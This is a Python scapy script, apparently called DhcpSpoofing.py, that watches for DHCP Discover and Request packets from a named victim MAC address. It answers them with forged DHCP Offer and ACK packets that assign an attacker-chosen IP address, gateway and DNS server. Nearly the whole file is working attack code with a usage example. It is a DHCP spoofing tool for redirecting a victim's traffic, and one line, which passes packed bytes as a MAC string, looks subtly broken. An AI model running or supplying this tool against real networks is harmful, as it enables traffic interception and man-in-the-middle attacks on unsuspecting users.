from scapy.all import *
from struct import *
from socket import *
import sys, os, time
 
def toMAC(strMac):
    cmList = strMac.split(":")
 
    hCMList = []
 
    for iter1 in cmList:
        hCMList.append(int(iter1, 16))
 
    hMAC = struct.pack('!B', hCMList[0]) + struct.pack('!B', hCMList[1]) + struct.pack('!B', hCMList[2]) + struct.pack('!B', hCMList[3]) + struct.pack('!B', hCMList[4]) + struct.pack('!B', hCMList[5]) 
 
    return hMAC
 
def toIP(strIP):
    ciList = strIP.split(".")
 
    hciList = []
 
    for iter1 in ciList:
        hciList.append(int(iter1, 10))
 
    hIP = struct.pack('!B', hciList[0]) + struct.pack('!B', hciList[1]) + struct.pack('!B', hciList[2]) + struct.pack('!B', hciList[3])
 
    return hIP
 
 

 
 
#DHCP leases
def detect_dhcp(pkt):
    if not pkt[Ether].src.lower() == victim_mac.lower():
            return
    
    try:
        dhcpPkt = pkt[DHCP]
    except:
        return
 
    #If DHCP Discover then DHCP Offer
    if pkt[DHCP] and pkt[DHCP].options[0][1] == 1:
        clientMAC = pkt[Ether].src
 
        print("DHCP Discover packet detected from " + clientMAC)
        
        sendp(
            Ether(src=spoofed_mac,dst="ff:ff:ff:ff:ff:ff")/
            IP(src=server_ip,dst="255.255.255.255")/
            UDP(sport=67,dport=68)/
            BOOTP(
                op=2,
                yiaddr=victim_assign_ip,
                siaddr=server_ip,
                giaddr=gateway_ip,
                chaddr=toMAC(clientMAC),
                xid=pkt[BOOTP].xid,
                sname=server_ip
            )/
            DHCP(options=[('message-type','offer')])/
            DHCP(options=[('subnet_mask',subnet_mask)])/
            DHCP(options=[('name_server',dns_ip)])/
            DHCP(options=[('lease_time',43200)])/
            DHCP(options=[('router',gateway_ip)])/
            DHCP(options=[('server_id',server_ip),('end')])
        )
        print("DHCP Offer packet sent")
     
    # id DHCP Request than DHCP ACK
    if pkt[DHCP] and pkt[DHCP].options[0][1] == 3:
        clientMAC = pkt[Ether].src
        print("DHCP Request packet detected from " + clientMAC)
 
        sendp(
            Ether(src=spoofed_mac,dst="ff:ff:ff:ff:ff:ff")/
            IP(src=server_ip,dst="255.255.255.255")/
            UDP(sport=67,dport=68)/
            BOOTP(
                op=2,
                yiaddr=victim_assign_ip,
                siaddr=server_ip,
                giaddr=gateway_ip,
                chaddr=toMAC(clientMAC),
                xid=pkt[BOOTP].xid
            )/
            DHCP(options=[('message-type','ack')])/
            DHCP(options=[('subnet_mask',subnet_mask)])/
            DHCP(options=[('lease_time',43200)])/
            DHCP(options=[('router',gateway_ip)])/
            DHCP(options=[('name_server',dns_ip)])/
            DHCP(options=[('server_id',server_ip),('end')])
        )
        print("DHCP Ack packet sent")
 



if __name__ == '__main__':

        if len(sys.argv) != 7:
            sys.exit('Usage: %s <victim mac> <victim assign IP> <server IP> <subnet mask> <gateway_ip IP> <dns_ip IP>\n \
            example: python DhcpSpoofing.py 00:0C:29:CA:1E:E5 192.168.72.130 192.168.72.129 255.255.255.0 192.168.72.129 192.168.72.2' % os.path.basename(__file__))


        global victim_mac, victim_assign_ip, server_ip, subnet_mask, gateway_ip, dns_ip, spoofed_mac
        victim_mac = sys.argv[1]
        victim_assign_ip = sys.argv[2]
        server_ip = sys.argv[3]
        subnet_mask = sys.argv[4]
        gateway_ip = sys.argv[5]
        dns_ip = sys.argv[6]
        spoofed_mac = toMAC(ARP().hwsrc)
        
        sniff(filter="arp or (udp and (port 67 or 68))", prn=detect_dhcp, store=0)
